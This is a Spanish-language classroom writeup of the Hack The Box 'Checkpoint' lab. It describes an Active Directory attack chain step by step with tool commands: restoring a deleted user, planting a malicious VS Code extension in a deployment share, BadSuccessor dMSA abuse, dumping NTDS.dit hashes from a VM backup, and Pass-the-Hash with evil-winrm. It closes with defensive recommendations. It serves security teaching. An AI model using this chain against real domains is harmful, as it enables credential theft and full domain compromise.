# Writeup — Hack The Box: Checkpoint

**Dificultad:** Medium  
**Tipo de máquina:** Windows / Active Directory  
**Objetivo didáctico:** comprender una cadena de compromiso en Active Directory basada en permisos mal configurados, objetos eliminados, automatización insegura, abuso de dMSA/BadSuccessor y extracción de credenciales desde backups.

> **Nota para alumnos:** Este writeup debe utilizarse únicamente en laboratorios autorizados como Hack The Box. No debe aplicarse contra sistemas reales sin permiso explícito.

---

## 1. Resumen ejecutivo de la máquina

La máquina **Checkpoint** es un laboratorio centrado en Active Directory. A diferencia de una máquina donde se explota una vulnerabilidad web directa, aquí el avance depende principalmente de **enumerar permisos**, entender **relaciones entre objetos del dominio** y abusar de configuraciones internas.

La cadena general es la siguiente:

1. Se inicia con credenciales válidas de un usuario de dominio de bajo privilegio.
2. Se enumeran servicios típicos de un Domain Controller.
3. Se identifican permisos de escritura sobre objetos de Active Directory.
4. Se restaura un usuario eliminado desde el contenedor de objetos borrados.
5. Ese usuario permite acceder a una carpeta compartida usada para extensiones de VS Code.
6. Se abusa de una automatización interna que instala extensiones.
7. Se obtiene ejecución como otro usuario.
8. Se abusa de dMSA/BadSuccessor para recuperar material Kerberos de una cuenta de servicio.
9. Esa cuenta de servicio permite leer backups de una VM.
10. Desde el backup se extraen hashes del dominio.
11. Finalmente, se usa Pass-the-Hash para comprometer el dominio.

---

## 2. Preparación del entorno

Antes de iniciar la explotación, hay dos problemas técnicos que pueden hacer perder mucho tiempo si no se corrigen.

---

### 2.1 Problema de MTU en la VPN

En algunos laboratorios de HTB, la interfaz VPN `tun0` puede tener un MTU demasiado alto. Esto provoca que algunas solicitudes pequeñas funcionen, pero otras más grandes se queden colgadas.

Síntomas comunes:

- LDAP o SMB responden parcialmente.
- Algunas peticiones Kerberos se quedan congeladas.
- Herramientas como `kerbad` pueden mostrar errores confusos.
- Transferencias grandes por SMB no avanzan.

Para diagnosticar tráfico Kerberos:

```bash
sudo tcpdump -i tun0 -n 'port 88'
```

Explicación:

- `-i tun0`: escucha en la interfaz VPN.
- `-n`: evita resolución DNS para ver IPs directamente.
- `'port 88'`: filtra tráfico Kerberos.

Para probar el tamaño máximo de paquete:

```bash
ping -M do -s 1272 <IP_OBJETIVO>
ping -M do -s 1322 <IP_OBJETIVO>
```

Explicación:

- `-M do`: activa “Don’t Fragment”.
- `-s`: define el tamaño del payload ICMP.

Si un tamaño funciona y otro falla, puede existir un límite de MTU en la ruta.

Solución recomendada:

```bash
sudo ip link set dev tun0 mtu 1300
```

Esto reduce el MTU de la interfaz VPN y evita que se generen paquetes demasiado grandes.

---

### 2.2 Problema de hora con Kerberos

Kerberos es muy sensible a la diferencia horaria entre el cliente atacante y el Domain Controller. Si la diferencia supera aproximadamente cinco minutos, la autenticación puede fallar.

Para consultar la hora del DC:

```bash
nmap --script smb2-time -p445 <IP_OBJETIVO>
```

Una forma práctica de guardar la hora del DC:

```bash
DCT=$(nmap --script smb2-time -p445 <IP_OBJETIVO> -oN - | awk -F'date: ' '/\| *date:/ {print $2}' | sed 's/T/ /' | head -1)
```

Luego, para ejecutar comandos Kerberos usando esa hora:

```bash
TZ=UTC faketime "$DCT" <COMANDO>
```

Esto no cambia la hora real del sistema; solamente ejecuta ese proceso simulando la hora indicada.

---

### 2.3 Resolución de nombres

En entornos Active Directory, muchos ataques y consultas dependen de nombres DNS, SPN y realm. Por eso conviene agregar el dominio y el DC al archivo `/etc/hosts`:

```bash
echo "<IP_OBJETIVO> checkpoint.htb dc01.checkpoint.htb DC01.CHECKPOINT.HTB dc01" | sudo tee -a /etc/hosts
```

---

## 3. Enumeración inicial

Partimos con credenciales válidas:

```text
Usuario: alex.turner
Dominio: checkpoint.htb
Contraseña: <password_proporcionado>
```

Validamos las credenciales con NetExec:

```bash
nxc smb <IP_OBJETIVO> -d checkpoint.htb -u alex.turner -p '<password>'
```

Si son válidas, veremos una línea similar a:

```text
[+] checkpoint.htb\alex.turner:<password>
```

Esto confirma que el usuario puede autenticarse en el dominio.

---

## 4. Enumeración de recursos SMB

Listamos las carpetas compartidas:

```bash
nxc smb <IP_OBJETIVO> -d checkpoint.htb -u alex.turner -p '<password>' --shares
```

Hallazgos relevantes:

| Recurso | Importancia |
|---|---|
| `DevDrop` | Carpeta relacionada con extensiones de VS Code. Más adelante será clave. |
| `VMBackups` | Carpeta de backups. Al inicio puede no ser accesible, pero será importante en la fase final. |
| `NETLOGON` | Recurso típico de un Domain Controller. |
| `SYSVOL` | Recurso típico de políticas y scripts de dominio. |

En este punto no debemos asumir explotación directa. El valor está en observar qué recursos existen y cómo podrían conectarse con permisos de usuarios o tareas automáticas.

---

## 5. Enumeración de usuarios del dominio

Podemos listar usuarios con:

```bash
nxc smb <IP_OBJETIVO> -d checkpoint.htb -u alex.turner -p '<password>' --users
```

Usuarios relevantes que aparecen en la cadena:

- `alex.turner`
- `mark.davies`
- `ryan.brooks`
- `svc_deploy`

Cada uno cumple un rol dentro de la ruta de ataque.

---

## 6. Enumeración de permisos de escritura en Active Directory

El paso clave es identificar qué objetos de Active Directory puede modificar el usuario inicial.

Usamos `bloodyad`:

```bash
bloodyad --host <IP_OBJETIVO> --dns <IP_OBJETIVO> -d checkpoint.htb \
  -u alex.turner -p '<password>' get writable
```

La salida importante indica permisos como:

```text
distinguishedName: CN=Mark Davies,...,CN=Deleted Objects,DC=checkpoint,DC=htb   permission: WRITE
distinguishedName: OU=Employees,DC=checkpoint,DC=htb                            permission: CREATECHILD
distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb             permission: WRITE
```

Interpretación:

- `WRITE` sobre `CN=Mark Davies,...,CN=Deleted Objects`: el usuario puede modificar el objeto eliminado de Mark Davies.
- `CREATECHILD` sobre `OU=Employees`: puede crear ciertos objetos dentro de esa OU.
- `WRITE` sobre su propio usuario: puede modificar atributos de su cuenta.

Este es el primer gran hallazgo. No encontramos una vulnerabilidad tradicional, sino una mala asignación de permisos en Active Directory.

---

## 7. Restauración del usuario eliminado `mark.davies`

Active Directory puede conservar objetos eliminados en el contenedor `Deleted Objects`. Si un usuario tiene permisos adecuados, puede restaurar objetos eliminados.

Restauramos `mark.davies`:

```bash
bloodyad --host <IP_OBJETIVO> --dns <IP_OBJETIVO> -d checkpoint.htb \
  -u alex.turner -p '<password>' set restore mark.davies
```

Resultado esperado:

```text
[+] mark.davies has been restored successfully
```

### ¿Qué significa esto?

El usuario `mark.davies` existía, fue eliminado, pero no fue completamente purgado del dominio. Al restaurarlo, vuelve a ser un objeto activo en Active Directory.

Este tipo de hallazgo es importante en auditorías reales porque muchas organizaciones no revisan adecuadamente los permisos sobre objetos eliminados.

---

## 8. Acceso como `mark.davies`

Una vez restaurado el usuario, se valida si es posible autenticarse. En el writeup original se indica que existe reutilización de contraseña/hash, lo cual permite avanzar con `mark.davies`.

Se puede probar SMB con hash NTLM:

```bash
nxc smb <IP_OBJETIVO> -d checkpoint.htb -u mark.davies -H <NT_HASH> --shares
```

El resultado importante es que `mark.davies` obtiene acceso con permisos sobre `DevDrop`.

Ejemplo conceptual:

```text
DevDrop     READ,WRITE
VMBackups   visible, sin acceso todavía
```

Esto cambia el escenario: ahora no solo podemos leer, también escribir en una carpeta que parece estar asociada al despliegue de extensiones de VS Code.

---

## 9. Abuso de `DevDrop`: extensiones VS Code

La carpeta `DevDrop` está relacionada con extensiones `.vsix` compatibles con VS Code.

Una extensión `.vsix` es un paquete de extensión de Visual Studio Code. En un entorno empresarial, podría existir una tarea programada o automatización que revise esa carpeta e instale extensiones aprobadas.

La idea de la explotación es:

1. Crear una extensión `.vsix` controlada por el atacante.
2. Subirla a `DevDrop`.
3. Esperar que una tarea automática la instale.
4. Lograr ejecución de código bajo el contexto del usuario que ejecuta esa tarea.

En esta máquina, la ejecución se relaciona con el usuario `ryan.brooks`.

### Punto didáctico

Esto representa un caso de **supply chain interno**. No se compromete una aplicación pública, sino un mecanismo interno de distribución de software. Si una carpeta de despliegue acepta escritura de usuarios no confiables, cualquier automatización que consuma su contenido se vuelve peligrosa.

---

## 10. Movimiento lateral hacia `ryan.brooks`

Al lograrse ejecución mediante la extensión, se obtiene contexto del usuario `ryan.brooks`.

Este usuario es importante porque tiene permisos que permiten continuar con la escalada en Active Directory.

En un laboratorio, normalmente se buscaría:

```bash
whoami
hostname
ipconfig
dir
```

Y se revisaría si existe una flag de usuario o archivos de interés.

También se debe enumerar qué permisos tiene este nuevo usuario dentro del dominio:

```bash
bloodyad --host <IP_OBJETIVO> --dns <IP_OBJETIVO> -d checkpoint.htb \
  -u ryan.brooks -p '<password_o_material_obtenido>' get writable
```

O, si se tiene una sesión, se podrían usar herramientas LDAP/AD para revisar ACLs.

---

## 11. Introducción a dMSA y BadSuccessor

### ¿Qué es dMSA?

dMSA significa **delegated Managed Service Account**. Es un tipo de cuenta administrada de servicio usada en entornos Windows modernos.

Su objetivo legítimo es permitir que servicios usen cuentas administradas con rotación y protección de claves.

### ¿Qué es BadSuccessor?

BadSuccessor es una técnica que abusa del mecanismo de migración/sucesión de dMSA.

La idea simplificada es:

- Se crea una dMSA.
- Se configura como sucesora de una cuenta objetivo.
- El KDC entrega a la dMSA material de claves relacionado con la cuenta objetivo para mantener compatibilidad durante la migración.
- Si el atacante controla la dMSA o puede leer su contraseña administrada, puede recuperar material útil de la cuenta objetivo.

En esta máquina, el objetivo es `svc_deploy`.

---

## 12. Preparación de BadSuccessor contra `svc_deploy`

Desde la información pública del writeup, se crea una dMSA que apunta a `svc_deploy`.

Ejemplo conceptual:

```bash
bloodyad --host <IP_OBJETIVO> --dns <IP_OBJETIVO> -d checkpoint.htb \
  -u alex.turner -p '<password>' \
  add badSuccessor '<svc-dmsa>' \
  -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' \
  --ou 'OU=Employees,DC=checkpoint,DC=htb' --prepatch
```

Explicación:

- `add badSuccessor`: usa el helper de bloodyad para preparar el abuso.
- `<svc-dmsa>`: nombre de la dMSA controlada por el atacante.
- `-t`: cuenta objetivo que se desea suplantar/heredar.
- `--ou`: OU donde se creará la dMSA.
- `--prepatch`: crea el objeto, pero no completa todos los atributos en el objetivo.

El uso de `--prepatch` es importante porque `alex.turner` puede crear la dMSA en la OU, pero no necesariamente puede modificar todos los atributos de `svc_deploy`. Esa parte se completa más adelante con otro usuario que sí tenga permisos.

---

## 13. Verificación de la dMSA creada

Para comprobar que la dMSA existe:

```bash
nxc ldap <IP_OBJETIVO> -d checkpoint.htb -u alex.turner -p '<password>' \
  --query '(sAMAccountName=<svc-dmsa>$)' 'distinguishedName msDS-ManagedAccountPrecededByLink'
```

La cuenta dMSA suele tener formato de cuenta de máquina, por eso el `sAMAccountName` termina en `$`.

Lo que se busca ver:

```text
msDS-ManagedAccountPrecededByLink = CN=svc_deploy,...
```

Esto confirma que la dMSA apunta a la cuenta `svc_deploy`.

---

## 14. Escalada hacia `svc_deploy`

Con los permisos adecuados desde `ryan.brooks`, se completa el abuso de BadSuccessor.

El objetivo es extraer material Kerberos o hash NTLM relacionado con `svc_deploy`.

Una vez obtenido el hash o ticket utilizable, se valida la cuenta:

```bash
nxc smb <IP_OBJETIVO> -d checkpoint.htb -u svc_deploy -H <NT_HASH> --shares
```

El hallazgo importante es que `svc_deploy` pertenece o tiene acceso a un grupo/recurso que permite leer `VMBackups`.

---

## 15. Acceso a `VMBackups`

Con `svc_deploy`, se vuelve a enumerar SMB:

```bash
nxc smb <IP_OBJETIVO> -d checkpoint.htb -u svc_deploy -H <NT_HASH> --shares
```

Ahora `VMBackups` debería ser accesible.

Se puede listar el contenido:

```bash
smbclient //<IP_OBJETIVO>/VMBackups -U 'checkpoint.htb/svc_deploy%<password_o_hash>'
```

O usando herramientas compatibles con Pass-the-Hash.

Dentro de `VMBackups`, la información relevante es un backup de máquina virtual, por ejemplo un disco `.vhdx`.

---

## 16. Extracción offline desde backup de VM

Si se obtiene un disco virtual de un Domain Controller, el objetivo es buscar archivos sensibles como:

- `NTDS.dit`
- Hive `SYSTEM`
- Hive `SECURITY`
- Hive `SAM`

En un Domain Controller, `NTDS.dit` contiene la base de datos de Active Directory, incluyendo hashes de cuentas del dominio.

### Flujo conceptual

1. Descargar o montar el `.vhdx`.
2. Localizar `NTDS.dit`.
3. Extraer también el hive `SYSTEM`.
4. Usar herramientas forenses para extraer hashes offline.

Ejemplo conceptual:

```bash
secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
```

Esto permite extraer hashes de usuarios del dominio sin interactuar directamente con el DC en ejecución.

---

## 17. Compromiso final con Pass-the-Hash

Si se obtiene el hash NTLM de `Administrator`, se puede validar acceso:

```bash
nxc smb <IP_OBJETIVO> -d checkpoint.htb -u Administrator -H <ADMIN_NT_HASH>
```

Si el hash es válido y el usuario tiene privilegios administrativos, se puede obtener una sesión remota autorizada en el laboratorio:

```bash
evil-winrm -i <IP_OBJETIVO> -u Administrator -H <ADMIN_NT_HASH>
```

Desde ahí se obtiene la flag final del laboratorio.

---

## 18. Cadena completa resumida

```text
alex.turner
   │
   ├── Enumera permisos AD con bloodyad
   │
   ├── Restaura usuario eliminado mark.davies
   │
   ├── Accede a DevDrop con mark.davies
   │
   ├── Sube extensión VSIX maliciosa
   │
   ├── Automatización ejecuta la extensión como ryan.brooks
   │
   ├── ryan.brooks permite completar abuso dMSA / BadSuccessor
   │
   ├── Se obtiene material de svc_deploy
   │
   ├── svc_deploy accede a VMBackups
   │
   ├── Se extrae NTDS.dit + SYSTEM desde backup
   │
   └── Se obtiene hash de Administrator y se usa Pass-the-Hash
```

---

## 19. Conceptos clave para los alumnos

### 19.1 Active Directory no solo se ataca por contraseñas

En esta máquina, el avance se logra por permisos mal configurados:

- Escritura sobre objetos eliminados.
- Creación de objetos en una OU.
- Permisos sobre cuentas de servicio.
- Acceso a carpetas compartidas sensibles.

### 19.2 Los objetos eliminados también son superficie de ataque

El contenedor `Deleted Objects` puede contener objetos restaurables. Si existen permisos inadecuados, un atacante puede revivir una cuenta antigua y abusarla.

### 19.3 La automatización interna puede ser peligrosa

Una carpeta de despliegue como `DevDrop` parece inofensiva, pero si un proceso automático instala lo que aparece allí, entonces el permiso de escritura equivale indirectamente a ejecución de código.

### 19.4 Las cuentas de servicio son objetivos críticos

`svc_deploy` resulta clave porque tiene acceso a backups. En entornos reales, las cuentas de servicio suelen tener más permisos de los necesarios.

### 19.5 Los backups pueden comprometer todo el dominio

Un backup de un Domain Controller puede contener `NTDS.dit`. Si un atacante accede a ese archivo junto con el hive `SYSTEM`, puede extraer hashes del dominio offline.

---

## 20. Recomendaciones defensivas

### 20.1 Revisar permisos en Active Directory

Auditar periódicamente:

- `GenericAll`
- `GenericWrite`
- `WriteDacl`
- `WriteOwner`
- `CreateChild`
- permisos sobre `Deleted Objects`
- permisos sobre OUs sensibles
- permisos sobre cuentas de servicio

### 20.2 Proteger el contenedor de objetos eliminados

Verificar quién puede:

- leer objetos eliminados,
- restaurarlos,
- modificarlos,
- cambiar atributos críticos.

### 20.3 Controlar carpetas de despliegue

Para recursos como `DevDrop`:

- aplicar mínimo privilegio,
- validar integridad de paquetes,
- firmar extensiones,
- registrar quién sube archivos,
- revisar procesos automáticos que consumen esos archivos.

### 20.4 Restringir cuentas de servicio

Las cuentas de servicio deben:

- tener permisos mínimos,
- no acceder a backups salvo necesidad real,
- usar autenticación fuerte,
- estar monitoreadas,
- no compartir contraseñas con usuarios normales.

### 20.5 Proteger backups

Los backups de DC deben tratarse como activos críticos.

Controles recomendados:

- cifrado en reposo,
- acceso restringido,
- monitoreo de descargas,
- segregación de funciones,
- almacenamiento fuera del dominio,
- rotación y pruebas controladas.

### 20.6 Monitorear eventos relevantes

Eventos y señales a revisar:

- restauración de objetos AD,
- creación de dMSA/gMSA,
- cambios en atributos `msDS-*`,
- escritura en shares de despliegue,
- instalación de extensiones VS Code,
- accesos anómalos a backups,
- lectura de archivos `.vhdx`,
- uso de Pass-the-Hash.

---

## 21. Preguntas para discusión en clase

1. ¿Por qué `WRITE` sobre un objeto eliminado puede convertirse en una vía de compromiso?
2. ¿Qué diferencia hay entre explotar una vulnerabilidad técnica y abusar de una mala configuración?
3. ¿Por qué una carpeta compartida con permisos de escritura puede ser tan peligrosa?
4. ¿Qué controles podrían evitar que una extensión `.vsix` maliciosa sea instalada automáticamente?
5. ¿Por qué `NTDS.dit` es uno de los archivos más sensibles en un Domain Controller?
6. ¿Qué señales de monitoreo podrían alertar sobre un ataque BadSuccessor?
7. ¿Qué políticas deberían aplicarse a cuentas de servicio como `svc_deploy`?

---

## 22. Conclusión

Checkpoint enseña una lección muy importante: en Active Directory, el compromiso no siempre empieza con una vulnerabilidad crítica o una contraseña débil. Muchas veces comienza con un permiso aparentemente menor.

La máquina combina varias ideas avanzadas:

- restauración de objetos eliminados,
- abuso de carpetas compartidas,
- ejecución indirecta mediante automatización,
- movimiento lateral,
- abuso de cuentas administradas de servicio,
- acceso a backups,
- extracción offline de hashes,
- Pass-the-Hash.

Para un analista defensivo, esta máquina refuerza la necesidad de auditar permisos, proteger backups, monitorear automatizaciones internas y aplicar mínimo privilegio en todo el dominio.
